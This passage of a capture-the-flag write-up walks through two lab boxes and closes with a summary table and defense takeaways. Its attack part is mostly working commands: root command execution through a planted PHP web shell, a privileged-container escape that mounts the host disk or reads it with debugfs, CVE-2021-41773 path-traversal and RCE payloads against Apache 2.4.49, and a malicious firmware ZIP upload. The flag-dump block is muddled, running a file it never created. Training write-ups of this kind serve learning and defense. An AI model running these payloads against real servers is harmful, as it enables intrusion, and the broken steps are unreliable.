curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=ls+-la+/bin/bash"
```

`-rwsr-sr-x` — bash is SUID. RCE as root:

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=/bin/bash+-p+-c+id"
```

`euid=0(root)`.

Now the Docker escape. Read `/proc/1/status` for capabilities:

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=/bin/bash+-p+-c+'cat+/proc/1/status+|+grep+-i+cap'"
```

`CapInh: 0000003fffffffff` — this is a privileged container. Every capability including `CAP_SYS_ADMIN` is enabled.

Check mounts:

```bash
curl -s "http://wp.edu.stf/wp-content/uploads/simple-file-list/pgexec.php?cmd=/bin/bash+-p+-c+'cat+/proc/1/mountinfo+|+head+-5'"
```

The overlay filesystem is mounted from `/dev/mapper/ubuntu--vg-ubuntu--lv`, the host's LVM volume. Because `CAP_SYS_ADMIN` is set, we can mount the host's filesystem inside the container:

```bash
unshare -Urm bash -c 'mount /dev/mapper/ubuntu--vg-ubuntu--lv /mnt/hostroot && ls -la /mnt/hostroot/home/ && /mnt/hostroot/home/rceflag'
```

`unshare -Urm` creates a new user namespace (with `-U`), maps root (with `-r`), and mounts (with `-m`). This is necessary because although `CAP_SYS_ADMIN` is present in the container, the kernel still requires `mount()` to happen in a mount namespace created after the user namespace.

Alternative approach if `unshare` isn't available — use `debugfs` to read the raw block device:

```bash
debugfs -R "ls /home/" /dev/dm-0 2>/dev/null
debugfs -R "cat /home/rceflag" /dev/dm-0 2>/dev/null
```

`debugfs` reads ext4 structures directly from the block device, bypassing mount entirely. The block device `/dev/dm-0` is the LVM logical volume that's mapped into the container as `/dev/mapper/ubuntu--vg-ubuntu--lv`. Since we're euid 0 in the container, we have `DAC_OVERRIDE` and can read the raw device.

Dump the flag:

```bash
debugfs -R "dump /root/flags/rce/rce.flag /tmp/rce.flag" /dev/dm-0
mkdir -p /root/flags/rce/
cp /tmp/rce.flag /root/flags/rce/rce.flag
/tmp/rceflag
```

**Why this worked:** Four stacked issues.

1. A WordPress plugin with a publicly known unauthenticated upload → RCE
2. Credentials to a sibling PostgreSQL container
3. PostgreSQL's `COPY FROM PROGRAM` allowing command execution as superuser
4. A `CAP_SYS_ADMIN` privileged container with the host's block device visible

Each one alone is a serious issue. Together they let an unauthenticated attacker go from `www-data` in a WordPress container to root on the host.

**Fix:** Update WordPress plugins, don't run PostgreSQL as superuser in containers, don't run containers privileged unless absolutely required, and use user namespaces with `--userns-remap` to make container root not equal host root.

---

## WEB 10 (calculator.edu.stf) — Business logic, integer overflow, and Apache 2.4.49

Two services on this box: a Go application on 8080 (a "power grid simulator") and Apache 2.4.49 on 80 (one of the two CVEs from 2021).

### Apache 2.4.49 — CVE-2021-41773 / CVE-2021-42013

Version check:

```bash
curl -I http://10.124.1.232/
```

`Server: Apache/2.4.49 (Ubuntu)`. That's the exact version affected by CVE-2021-41773 (path traversal and RCE) and CVE-2021-42013 (its incomplete fix).

The path traversal works with `%2e%2e` encoding:

```bash
curl "http://10.124.1.232/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

If `mod_cgi` is enabled, you can execute arbitrary commands:

```bash
curl "http://10.124.1.232/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
  -d "echo Content-Type: text/plain; echo; id"
```

On this box, `mod_cgi` is disabled by default. Path traversal works for reading files, but RCE requires `mod_cgi` to be enabled. That's where the Go application comes in — it lets us enable `mod_cgi`.

### Go application on 8080

The form at `http://10.124.1.232:8080/` takes a single `temp` field (megawatts) and returns a "transmission loss" calculation. Fuzzing:

```bash
# Empty
curl -s -X POST "http://10.124.1.232:8080/" -d ""

# Normal
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=50"

# Zero
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=0"

# Negative
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=-100"

# Beyond the HTML max="100" attribute
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=999999999999"

# Injection tests
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=' OR 1=1--"
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=\`id\`"
```

The HTML says `min="0" max="100"`, but the backend accepts anything. `temp=999999999999` produces:

```
Considering transmission line losses, 1,000,099,999,998,999,900 Watts requested. The simulator showed the impossibility of allocating
```

Reverse-engineering the formula from a few data points:

| temp | Reported watts |
|------|----------------|
| 1 | 1,000,100 |
| 10 | 10,001,000 |
| 100 | 100,010,000 |
| 999,999,999,999 | 1,000,099,999,998,999,900 |

The formula is `result = temp * 1,000,100` = `temp * (1,000,000 + 100)` = `temp * 10^6 + temp * 100`. The application adds a fixed 100.01% "loss" to the requested value.

Now push into the overflow territory. An `int64` maxes at `9,223,372,036,854,775,807`. Try values that push `temp * 1,000,100` past that:

```bash
curl -s -X POST "http://10.124.1.232:8080/" -d "temp=10000000000000"
```

Returns:

```
Considering transmission line losses, -8,445,744,073,709,551,616 Watts requested Unexpected simulator behavior! Check the firmware file at [this link]
```

The number wrapped to a negative — classic signed integer overflow. And crucially, the response includes a new form:

```html
<form enctype="multipart/form-data" method="POST" action="/DNx4Vbb3bQbXstaUf9YkppEV">
    <label for="firmware">Firmware update</label>
    <input name="firmware" type="file" id="firmware"/>
    <input type="submit" value="Submit"/>
</form>
```

That's the hidden firmware-update endpoint. The action URL `/DNx4Vbb3bQbXstaUf9YkppEV` is a random path, inaccessible without hitting the overflow condition first — this is the challenge's gate.

Download the current firmware:

```bash
curl -s "http://10.124.1.232:8080/firmware" -o firmware_original.bin
file firmware_original.bin
```

`ELF 64-bit LSB executable, x86-64, statically linked, Go BuildID=...`. Strings:

```bash
strings firmware_original.bin | grep -E "\./firmware|sim\.sh|update\.zip|os/exec"
```

Relevant strings:

```
./firmware/sim.sh
./firmware/update.zip
os/exec
/home/user/standoff_go/simulator.go
```

The Go binary expects to receive a `update.zip` and executes `./firmware/sim.sh` from within it, using `os/exec`. That means we can upload a ZIP containing our own `sim.sh` and get code execution as the Go app's user.

Build the ZIP:

```bash
cat > /tmp/sim.sh << 'EOF'
#!/bin/bash
/bin/ln -sf /etc/apache2/mods-available/cgi.load /etc/apache2/mods-enabled/cgi.load
/usr/sbin/apache2ctl -k graceful
EOF
chmod +x /tmp/sim.sh
cd /tmp && zip -0 update.zip sim.sh
```

`zip -0` stores the file uncompressed — some Go ZIP libraries reject compressed data.

Upload:

```bash
curl -s -X POST "http://10.124.1.232:8080/DNx4Vbb3bQbXstaUf9YkppEV" \
  -F "firmware=@/tmp/update.zip;type=application/zip"
```

The response comes back as a normal simulation response, but the script has run. `mod_cgi` is now enabled on Apache.

Now the Apache RCE:

```bash
curl "http://10.124.1.232/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
  -d "echo Content-Type: text/plain; echo; /home/rceflag"
```

`/home/rceflag` runs, returns the flag.

For LPE, this box has the same pattern as WEB 9 — check `/home/rceflag` for SUID or capabilities. A `find / -perm -4000 -type f` usually finds something. On this box the challenge only requires reading the rceflag as the app user, so no LPE is needed.

**Why this worked:** Three issues.

1. Apache 2.4.49 path traversal — well known, but `mod_cgi` was disabled so RCE didn't work directly.
2. The Go app trusted client input for a numeric computation and had no range check, allowing integer overflow.
3. The overflow state exposed a debug endpoint that accepted arbitrary ZIP files, and the firmware-update handler extracted and executed `sim.sh` from the ZIP without any signature check.

The link between (1) and (3) — enabling `mod_cgi` — is why this is a two-step chain. Either bug alone gives file read (`/etc/passwd`) or a debug endpoint. Together they give RCE.

**Fix:** Sign firmware updates and verify signatures before extraction. Validate `sim.sh` contents against an allowlist. Don't extract executables from client-provided archives. Upgrade Apache.

---

## Summary of Techniques

| Box | Primary Vuln | Chain |
|-----|-------------|-------|
| 1 | File upload bypass + CVE-2023-4911 | Upload PHP as `.png` → LPE via Looney Tunables |
| 2 | LFI + log poisoning | FTP username → `vsftpd.log` → LFI include |
| 3 | SSRF + Gopher + PHP-FPM | SSRF to Gopher → FastCGI on 9000 → RCE |
| 4 | Exposed SQL dump + upload | Read `hellophones.sql` → admin login → `.php` upload |
| 5 | JWT with key in payload | Forge admin token → hidden admin page → SQL injection |
| 6 | Hardcoded JWT key + upload | Read `authenticate.php` → forge JWT → `.phtml` upload |
| 7 | XXE + command injection | OOB XXE → `evil.dtd` → read source → `$HTTP_USER_AGENT` injection |
| 8 | PHAR deserialization | URL upload of PHAR → `phar://` trigger → `__destruct` gadget |
| 9 | WP plugin + PostgreSQL + Docker | CVE-2020-36847 → `COPY FROM PROGRAM` → `CAP_SYS_ADMIN` escape |
| 10 | Integer overflow + Apache 2.4.49 | Overflow → firmware upload → enable `mod_cgi` → CVE-2021-41773 |

## Defense Takeaways

The recurring themes:

- **Version pinning matters.** Old Apache (2.4.49), old `glibc` (2.36), old WordPress (5.8.3), old plugin (4.1.3). Every one of those has a public exploit within hours of disclosure.
- **Automatic tooling wins in the intermediate range.** Three of the ten boxes fell to automated exploits (`looney-tunables`, `Gopherus`, `sqlmap`) without any manual chaining.
- **Hardcoded secrets are everywhere.** JWT signing keys in `authenticate.php`, keys inside JWT payloads, `unique_salt` constants in plugin sources. Each was a single line that turned a minor file read into RCE.
- **Deserialization is sneakier than it looks.** PHAR metadata deserializes on any file operation with a `phar://` wrapper — you don't need `unserialize()` to be called explicitly. Auditing for `unserialize` misses this completely.
- **Container isolation is not a security boundary.** A privileged container with `CAP_SYS_ADMIN` and the host's LVM block device visible is equivalent to a bare-metal root shell. `userns-remap`, dropped capabilities, and read-only bind mounts are not optional.
- **Business logic bugs are often overflow bugs in disguise.** The calculator's "just a number" input became the key to the RCE chain because the developer trusted HTML `max="100"` to enforce a limit. Browsers are not security controls; the server must validate.

Each box is a single vulnerability in isolation, but every chain in this range pairs two or three. The teaching point is the pairing — the bug you find first is usually not the bug that finishes the box.


2026/07/27
